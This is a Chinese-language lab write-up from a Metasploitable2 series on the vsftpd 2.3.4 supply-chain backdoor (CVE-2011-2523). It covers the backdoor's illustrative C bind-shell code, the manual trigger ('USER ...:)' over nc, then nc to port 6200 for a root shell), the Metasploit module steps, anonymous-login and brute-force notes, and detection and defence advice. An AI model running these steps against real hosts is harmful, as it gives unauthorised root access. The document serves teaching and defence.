# vsftpd 2.3.4 后门

> **Metasploitable2 系列** -- 21 端口 FTP 攻击篇。本篇记录 vsftpd 2.3.4 后门漏洞（CVE-2011-2523）的原理与利用，这是 Metasploitable2 上 21 端口最直接、危害最高的攻击路径。

---

## 概述

Metasploitable2 的 21 端口运行 vsftpd 2.3.4。这个特定版本在 2011 年曾被植入后门：只要在登录用户名末尾加上 `:)` 两个字符，FTP 守护进程就会在 6200 端口开出一个以 root 身份运行的 shell。

这条路径的特别之处在于它不是传统意义上的"代码缺陷"，而是一次**供应链投毒**——攻击者篡改了官方分发的源码包。理解这一点会改变你对"漏洞"边界的认知。

---

## 漏洞背景：供应链投毒，不是代码 Bug

2011 年 7 月，vsftpd 官方站点的 `vsftpd-2.3.4.tar.gz` 被替换为植入恶意代码的版本，持续了数小时到数天。事件要点：

- 投毒发生在**上游分发环节**，不是某个下游用户配置失误。
- 恶意代码混入 `login.c` 的认证流程，外观上与正常逻辑交织，不易察觉。
- 事件暴露后官方撤下了投毒分发包，2.3.5 及之后版本不含该后门。

这件事的价值不在于"又一个 CVE"，而在于它说明：**软件的版本号和官方来源都不足以保证可信**。同类的供应链事件后来在 CCleaner、event-stream、xz-utils 上反复上演。把 vsftpd 2.3.4 放在这个脉络里看，它是一个早期且清晰的样本。

---

## 根本原因

后门由两段恶意代码组成，分别插入 vsftpd 源码的不同位置，通过 `USER` 命令串联触发。

### 触发点 — 认证流程中的条件判断

在 `USER` 命令的处理逻辑中（`login.c`），攻击者插入了一个条件检查。vsftpd 收到 `USER` 后先 fork 子进程处理认证，在子进程中执行以下逻辑：

```c
// 子进程的认证函数中（vsf_auth_login_user 区域）
if (str_ends_with(username, ":)")) {      // [自定义] str_endstr() - vsftpd 字符串工具，检查是否以给定后缀结尾
    spawn_backdoor();                      // [自定义] 攻击者添加的后门函数，见下节
}
// 无论是否命中，继续走正常认证流程
```

`str_endstr` 是 vsftpd 已有的工具函数，攻击者只需插入一个 if 判断 + 一次函数调用即可激活后门，改动量极小，混在正常认证逻辑中不易被代码审查发现。

触发字符选 `:)` 并非随机：正常 FTP 用户名中几乎不可能出现，避免误触发；两者均为 ASCII 可打印字符，FTP 协议不转义，攻击者可精确控制。

### 后门实现 — TCP Shell 孵化器

被调用的后门函数（添加在 `sysutil.c`）本质是一个 TCP shell 孵化器：

```c
void spawn_backdoor(void)
{
    int sock, client;                        // sock=监听端fd, client=accept返回的客户端fd, 均为 int
    struct sockaddr_in addr;                 // [C标准库] <netinet/in.h> 定义的 IPv4 地址结构体

    sock = socket(AF_INET, SOCK_STREAM, 0);  // [系统调用] 创建通信端点, AF_INET=IPv4, SOCK_STREAM=TCP, 0=自动选协议
    addr.sin_port = htons(6200);             // [C标准库] htons() 将主机序转网络字节序, 6200=后门监听端口
    addr.sin_addr.s_addr = INADDR_ANY;       // INADDR_ANY 宏, 绑定所有网卡接口(0.0.0.0)

    bind(sock, &addr, sizeof(addr));         // [系统调用] 将 socket 绑定到 0.0.0.0:6200
    listen(sock, 1);                         // [POSIX] 标记被动 socket, 1=backlog 队列长度

    client = accept(sock, NULL, NULL);       // [POSIX] 阻塞等待连接, 返回客户端 fd, NULL=不关心对端地址
    dup2(client, 0);                         // [系统调用] 将 fd 0(stdin) 重定向到 client, 此后进程从 TCP 连接读输入
    dup2(client, 1);                         // [系统调用] 将 fd 1(stdout) 重定向到 client, 输出发回 TCP 连接
    dup2(client, 2);                         // [系统调用] 将 fd 2(stderr) 重定向到 client
    execve("/bin/sh", NULL, NULL);           // [系统调用] 用 /bin/sh 替换当前进程, NULL=无参数/无环境变量
}
```

调用链：`USER命令处理 -> [系统调用] fork() -> 子进程中 spawn_backdoor() -> accept() -> dup2() x3 -> execve()`。全程运行在 root 上下文中，因为子进程在降权前 fork 并执行。

accept 之后的 `dup2` x3 + `execve` 是 Unix 中标准的"socket 绑定标准 I/O"模式 — 连接 6200 = 打开交互式终端。

### 为什么拿到的是 root

vsftpd 必须绑定 TCP 21（<1024 特权端口），因此以 root 启动。正常流程中认证完成后子进程降权（`setuid(nobody)`）。但后门安插在 `USER` 处理阶段 — 此时降权尚未发生，fork 出的后门子进程继承 root 身份。

这是一次**权限时序攻击**：恶意代码的插入位置选在了 `setuid` 之前的认证路径上。

---

## 触发条件

- 目标运行 vsftpd **2.3.4**（且为被投毒的版本）。
- 攻击者能向 21 端口发送 `USER` 命令，且用户名以 `:)` 结尾。
- 6200 端口可达（未被防火墙过滤）。

注意：后门只在被投毒的 2.3.4 构建中存在。同样是 2.3.4，若是从可信源重新编译的干净源码，则不含后门。Metasploitable2 镜像内嵌的是投毒版本。

---

## 影响分析

- 控制面：直接获得目标 root shell，完全控制主机。
- 范围：整机沦陷，可进而作为内网跳板。
- 隐蔽性：后门 shell 不经过任何认证；若不专门监控 6200 端口和异常进程派生，极难发现。

理论影响与实践影响在此一致：拿到 root。

---

## 攻击流程

### 1. 前置侦察

先确认 21 端口的服务与版本。版本号是判断是否存在后门的决定性依据。

```bash
nmap -sV -p 21 192.168.x.x
```

Metasploitable2 预期返回：

```
21/tcp open ftp vsftpd 2.3.4
```

看到 `vsftpd 2.3.4` 即可判定为后门版本。这一步的意义在于把"盲打"变成"基于版本定向利用"。

### 2. 手工触发后门

用 nc 连上 21 端口，按 FTP 协议手工发 `USER`/`PASS`：

```bash
nc 192.168.x.x 21
```

连上后依次输入（用户名末尾必须是 `:)`）：

```
USER backdoored:)
PASS any
```

服务端典型响应：

```
220 (vsFTPd 2.3.4)
331 Please specify the password.
530 Login incorrect.
```

`530 Login incorrect`（或 `500 OOPS: priv_sock_get_result`）是**正常现象**——后门在 `USER` 处理阶段就已触发，登录是否成功与后门是否开启无关。

> 实际测试中 Metasploitable2 回报的是 `500 OOPS: priv_sock_get_result`。原因是后门代码打断了 vsftpd 的 privilege separation 机制，母进程通过 pipe 收不到子进程的正常认证返回。这与 `530` 本质相同——都是后门已触发的信号，不影响 6200 端口的 shell。看到这类报错不要以为失败。

### 3. 连接 6200 拿 shell

后门触发后，6200 端口已监听。另开一个终端连接：

```bash
nc 192.168.x.x 6200
```

连上即获得 root shell。验证身份：

```bash
id
whoami
```

预期输出 `uid=0(root)` / `root`。

> 偶发情况下 `USER` 后 6200 需要一两秒才就绪，连不上时稍等重试。若始终不通，先用 `nmap -p 6200 192.168.x.x` 确认端口状态。

### 4. Metasploit 利用

正确的渗透测试流程不是看到服务名直接上 exploit，而是：

**侦察 -> 搜索漏洞 -> 评估匹配度 -> 利用**

**搜索阶段**：进 msfconsole 后先查该服务有哪些已注册模块：

```
msfconsole -q
search vsftpd
```

输出两个模块：

| # | 模块 | 目标版本 | 匹配 2.3.4？ |
|---|------|---------|-------------|
| 0 | `auxiliary/dos/ftp/vsftpd_232` | <= 2.3.2 (CVE-2011-0762) | 否，漏洞已在 2.3.3 修复 |
| 1 | `exploit/unix/ftp/vsftpd_234_backdoor` | 2.3.4 | 是，精确版本匹配 |

**评估阶段**：用 `info` 确认模块详情：

```
info 1
```

关注几个字段：`Rank: Excellent`（稳定可靠）、`Privileged: Yes`（root 权限）、`Disclosed: 2011-07-03`（与 nmap 中 2.3.4 版本时间线吻合）。`RPORT` 默认值为 `21`，无需手动设置。

**利用**：

```
use 1
set RHOSTS 192.168.x.x
exploit
```

成功后返回一个 root 的 command shell 会话（默认 payload `cmd/unix/interact`）。

> **手工利用残留会影响 msf 模块**：如果之前手工 `nc 192.168.x.x 6200` 的连接还开着，msf 模块会报 `The port used by the backdoor bind listener is already open` 并失败。先关闭所有到靶机 6200 的旧连接再跑 exploit。

---

## 同一端口的其他攻击面

21 端口除了后门，还有两条常规路径，作为补充侦察：

- **匿名登录**：`ftp 192.168.x.x`，用户名 `anonymous`、密码任意。若开启，可读取 FTP 共享目录内容，用于信息收集。
- **弱口令爆破**：用 Hydra 对 FTP 跑字典，详见本系列 [[Hydra]]。FTP 不像 SSH 有 `MaxStartups` 限制，线程可开高，但仍建议先用 `-e s` 跑"用户名即密码"。

这三条路径不是互斥的：后门是最快拿 root 的路，匿名登录和爆破是后门失效时的备选与信息补充。

---

## 检测方法

- **版本指纹**：`vsftpd 2.3.4` 本身就是高危信号，正常环境不应存在该版本。
- **端口异常**：主机上出现非预期的 6200 监听端口。
- **行为异常**：FTP 服务派生 `/bin/sh` 子进程，或 `USER` 含 `:)` 后产生异常 fork。
- **流量特征**：FTP 控制连接中出现以 `:)` 结尾的 `USER` 命令。

---

## 防御方案

1. **升级版本**（根本性）：移除 2.3.4，升级到 2.3.5 及以上。后门代码只存在于被投毒的 2.3.4 分发包。
2. **校验软件完整性**（根本性，针对供应链）：下载源码包时核对官方签名/校验和，避免使用来源不可信的构建。这是 vsftpd 事件最核心的教训。
3. **最小权限**（缓解性）：让 vsftpd 以非 root 运行或尽早降权，限制后门 shell 的权限上限。注意：绑定 21 特权端口本身需要初始 root，降权时机必须早于认证逻辑。
4. **网络控制**（缓解性）：限制 FTP 服务的暴露范围，监控异常监听端口和出站连接。

---

## 经验沉淀

- **先看版本再动手**。`nmap -sV` 一条命令把攻击从"猜测"变成"定向利用"，21 端口看到 `vsftpd 2.3.4` 基本等于拿到 root。侦察不是流程上的过场，是效率的来源。
- **`530`（或 `500 OOPS`）不是失败**。后门在认证结果返回之前就已触发，登录报错与后门开启解耦。理解触发时序才能正确判断利用是否成功，避免被服务端的"登录失败"误导而放弃。
- **后门不等于漏洞**。vsftpd 2.3.4 是供应链投毒，不是编码疏忽。这意味着防御重心在"软件可信来源与完整性校验"，而不仅是"打补丁"。把它和 xz-utils 等事件放在同一脉络理解。
- **拿到 shell 后先 `id` 再做事**。确认权限边界（root 还是非 root）决定后续提权是否必要，也避免在低权限 shell 里空跑提权步骤。
- **手工利用与工具利用互斥**。手工 `nc` 挂着 6200 时，msf 模块会因为端口已被占用而失败。切换工具前先清理旧连接。
- **渗透方法论优先**：`search -> info -> exploit` 而非 `use -> exploit`。先搜索有哪些模块、评估版本是否匹配、理解模块能力边界，再决定用哪个。跳过搜索和评估直接利用，是"工具操作员"和"渗透测试工程师"的分界线。

---

## 相关 CVE / 参考资料

- CVE-2011-2523: vsftpd 2.3.4 后门
- Metasploit 模块：`exploit/unix/ftp/vsftpd_234_backdoor`、`auxiliary/dos/ftp/vsftpd_232`
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2011-2523
- Chris Evans 原始披露: http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
